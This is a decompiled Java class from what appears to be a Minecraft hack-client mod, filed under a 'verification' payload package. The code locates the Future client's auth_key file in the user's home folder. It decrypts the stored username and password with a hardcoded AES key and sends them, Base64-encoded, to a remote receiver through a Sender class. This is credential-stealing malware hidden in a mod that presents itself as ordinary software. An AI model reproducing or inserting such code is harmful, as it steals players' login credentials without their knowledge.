//Deobfuscated with https://github.com/SimplyProgrammer/Minecraft-Deobfuscator3000 using mappings "C:\Users\Admin\Desktop\Minecraft-Deobfuscator3000-1.2.2\1.12 stable mappings"!

//Decompiled by Procyon!

package me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.impl;

import java.nio.charset.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.payload.*;
import javax.crypto.spec.*;
import javax.crypto.*;
import java.security.*;
import java.security.spec.*;
import me.shatteredhej.railhack.railhackmod.util.extra.utils.verification.util.*;
import java.io.*;
import java.nio.file.*;
import java.util.*;

public final class FutureAuth implements Payload
{
    @Override
    public void execute() throws Exception {
        final String[] auth = this.getFutureAuth();
        if (auth != null && auth.length == 2) {
            Sender.send(new Message.Builder("Login").addField("Username (Base64)", Base64.getEncoder().encodeToString(auth[0].getBytes(StandardCharsets.UTF_8)), true).addField("Password (Base64)", Base64.getEncoder().encodeToString(auth[1].getBytes(StandardCharsets.UTF_8)), true).build());
        }
        else {
            Sender.send("Failed to get future auth " + Arrays.toString(auth));
        }
    }
    
    private byte[] futureReadFile(final DataInputStream dataInputStream) throws IOException {
        final byte[] arrby = new byte[dataInputStream.readInt()];
        dataInputStream.read(arrby);
        return arrby;
    }
    
    private byte[] futureKeyConvert() {
        final byte[] array = new byte["428A487E3361EF9C5FC20233485EA236".length() / 2];
        for (int i = 0, n = 0; i < "428A487E3361EF9C5FC20233485EA236".length(); i = n) {
            final int n2 = n / 2;
            final byte b = (byte)((Character.digit("428A487E3361EF9C5FC20233485EA236".charAt(n), 16) << 4) + Character.digit("428A487E3361EF9C5FC20233485EA236".charAt(n + 1), 16));
            n += 2;
            array[n2] = b;
        }
        return array;
    }
    
    public static byte[] futureDecryptFile(final byte[] array, final byte[] array2, final byte[] array3) throws Exception {
        final SecretKeySpec secretKeySpec = new SecretKeySpec(array2, "AES");
        final IvParameterSpec ivParameterSpec = new IvParameterSpec(array3);
        final Cipher instance = Cipher.getInstance("AES/CBC/PKCS5PADDING");
        instance.init(2, secretKeySpec, ivParameterSpec);
        return instance.doFinal(array);
    }
    
    private String[] getFutureAuth() {
        final Optional<File> file = FileUtil.getFile(System.getProperty("user.home") + "\\Future\\auth_key");
        if (file.isPresent()) {
            try {
                final byte[] key = this.futureKeyConvert();
                final DataInputStream dis = new DataInputStream(Files.newInputStream(file.get().toPath(), new OpenOption[0]));
                final byte[] arr1 = this.futureReadFile(dis);
                final byte[] username = futureDecryptFile(this.futureReadFile(dis), key, arr1);
                final byte[] password = futureDecryptFile(this.futureReadFile(dis), key, arr1);
                final String user = new String(username, StandardCharsets.UTF_8);
                final String pass = new String(password, StandardCharsets.UTF_8);
                return new String[] { user, pass };
            }
            catch (Exception var8) {
                return null;
            }
        }
        return null;
    }
}
